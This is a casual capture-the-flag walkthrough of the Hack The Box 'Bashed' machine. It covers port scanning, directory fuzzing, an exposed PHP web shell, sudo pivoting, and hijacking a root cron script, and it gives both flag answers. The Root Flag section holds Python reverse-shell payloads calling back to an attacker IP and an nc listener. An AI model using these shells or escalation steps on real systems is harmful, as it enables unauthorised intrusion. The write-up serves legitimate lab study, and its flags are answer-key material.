# Tasks

[**How many open TCP ports are listening on Bashed?**](#task-1)

[**What is the relative path on the webserver to a folder that contains phpbash.php?**](#task-2)

[**What user is the webserver running as on Bashed?**](#task-3)

[**User Flag**](#user-flag)

[**www-data can run any command as a user without a password. What is that user's username?**](#task-5)

[**What folder in the system root can scriptmanager access that www-data could not?**](#task-6)

[**What is filename of the file that is being run by root every couple minutes?**](#task-7)

[**Root Flag**](#root-flag)

# Tools Used

- nmap
- gobuster

# Skills Used

- Directory fuzzing
- Python scripting (script kiddie moment tho lmao)

# Solutions

## Task 1

I did this first:

```
nmap -sCV [IP Address]
```

Only port 80 showed:

![image](https://github.com/user-attachments/assets/fbfc0cb3-eeed-447c-86f6-5fcce1245392)

So, considering it was only port 80 (which was strange), I tried using the ``-sS`` flag to show all TCP ports.

It was the same thing :///

**Answer: 80**

## Task 2

_Gobuster_ time:

```
gobuster dir -u http://[IP Address] -w /usr/share/dirb/wordlists/common.txt -x php
```

Also, you can use other wordlists if you like, and maybe include other file extensions.

![image](https://github.com/user-attachments/assets/d233af5b-05a6-4c3b-b7e8-209ab2cb79f8)

After that, I checked each directory one-by-one (yes I know, it's inefficient, but I forgot what the command was to recursively search endpoints lmao).

I found it here in _/dev_:

![image](https://github.com/user-attachments/assets/10525665-1438-4bbd-8729-aa6fcfb10c67)

**Answer: /dev**

## Task 3

Naturally, I got curious as to why we want to see ```phpbash.php```:

![image](https://github.com/user-attachments/assets/09c6df72-8ce9-45eb-997d-fe2c968fbfeb)

Apparently it really was a bash lmao.

Anyways, apparently I'm either blind or retarded lmao, I misread the task as "find the name of the webserver on Bashed", when I just needed to find the _user_ ://

It was one of the first commands I ran too:

![image](https://github.com/user-attachments/assets/36dca046-6585-4d1f-a557-c0b4d97a2807)

See ://

**Answer: www-data**

## User Flag

Here you go:

![image](https://github.com/user-attachments/assets/6964a817-0da7-4aaa-97ef-03760a56bd61)

**Answer: c9097fe5a29264941a6b3a7798018454**

## Task 5

Simple ```sudo -l``` will do:

![image](https://github.com/user-attachments/assets/0a689431-444f-40cc-baeb-120a7b783399)

**Answer: scriptmanager**

## Task 6

Simple ```ls -l``` will do (no need for ```-a``` since we don't need to see hidden files here, just permissions):

![image](https://github.com/user-attachments/assets/4f9193c8-712f-4b6f-ae9a-403f37a02cdf)

**Answer: scripts**

## Task 7

Ok so, I looked at the official writeup and it made me notice that I can run any command as _scriptmanager_, which I kinda overlooked lmao.

So anyways, I switched to that user real quick with this:

```
sudo -u scriptmanager bash -i
```

That way, I can do more stuff.

Or at least, I would've if it'd let me ://

So instead, I just used ```cat``` as _scriptmanager_ lmao.

![image](https://github.com/user-attachments/assets/a1a9bc3e-e027-4b38-8075-56bb20221c05)

So, supposedly this was the file that was being executed every few minutes, but I don't actually have proof now do I.

So now, I'm gonna go look for proof...

![image](https://github.com/user-attachments/assets/a055dacf-0118-4895-8dc3-930876ac3ba2)

I found proof :D, test runs every 6 minutes (if I'm reading it right).

Embarassingly, I forgot cronjobs were not daemons lmao.

**Answer: test.py**

## Root Flag

So I've been stuck on this for wayyyyy to long, cuz I forgot to establish an inital reverse shell that was more interactive than the web shell given to us by _phpbash.php_.

Basically, here's what I did to finally get out of that roadblock:

```
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(([IP Address],[Port]));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
```

Real simple right?

Yeah I forgot to do that lmao.

Anyways, on my main machine, I was listening for the request via:

```
nc -lvnp [Port]
```

So now, I can finally do this:

![image](https://github.com/user-attachments/assets/bfc89e88-06af-4a97-beca-0c23cde01eba)

Now that it's interactive, I can establish a shell as _scriptmanager_, FINALLY.

Anyways, now we gotta tweak that _test.py_ file to establish a reverse shell, so since we already used a python script to establish that, we may as well reuse that and just change the port to a different one.

**P.S.** In the [**revshell generator**](https://www.revshells.com/), be sure to set the shell to _/bin/sh_ (that's what worked for me).

Here's the exact scripts just for future reference:

```
import socket,subprocess,os,pty;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.10.14.11",4444));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
pty.spawn("/bin/sh");
```

Also now that I look at it properly, you can probably get away with not importing ```subprocess``` since we're not using it to get a shell anyway lol.

Anyways, after a wee bit of waiting (and after partially [stabilizing](https://medium.com/@varunrajamirtharaj/stabilizing-a-shell-getting-a-fully-functional-tty-31232897f2f5) my interactive shell to use _nano_), I finally got what I wanted.

![image](https://github.com/user-attachments/assets/8087966f-ab6f-4c90-be3d-9b61f293f0b5)

That honestly took wayyyy too long (even with writeups lmao), but it was still pretty fun regardless.

**Answer: b48a1c0925f34e00d21827778ddc9a26**
